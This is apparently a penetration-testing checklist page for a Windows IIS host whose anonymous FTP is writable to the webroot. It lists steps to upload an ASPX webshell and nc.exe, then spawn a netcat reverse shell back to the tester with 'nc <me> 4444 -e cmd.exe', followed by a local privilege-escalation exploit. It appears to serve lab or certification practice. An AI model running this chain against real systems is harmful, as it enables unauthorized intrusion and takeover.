---
description: Windows with writable anonymous FTP in Webroot
---

# Windows-FTP-WWW

In this scenario a Windows machine is firewall protected but has open FTP and HTTP ports.  Upon enumeration it is discovered that FTP allows anonymous login to the webroot folder if IIS.

* [ ] FTP to target / logon as anonymous
* [ ] Upload ASPX webshell from /usr/share/webshells/aspx/cmdasp.aspx 
* [ ] Switch to binary mode and upload nc.exe from /usr/share/windows-binaries/
* [ ] Start netcat listener \(nc -nlvp 4444\)
* [ ] Browse to target cmdasp.aspx and execute netcat reverse shell \(nc &lt;me&gt; 4444 -e cmd.exe\)
* [ ] Check whoami \(app pool identity\)
* [ ] Check ver and match to OS
* [ ] Searchploit OS \| grep local
* [ ] Choose local exploit and upload to target
* [ ] Execute exploit using netcat reverse shell
* [ ] Get admin or system shell, check whoami, get proofs



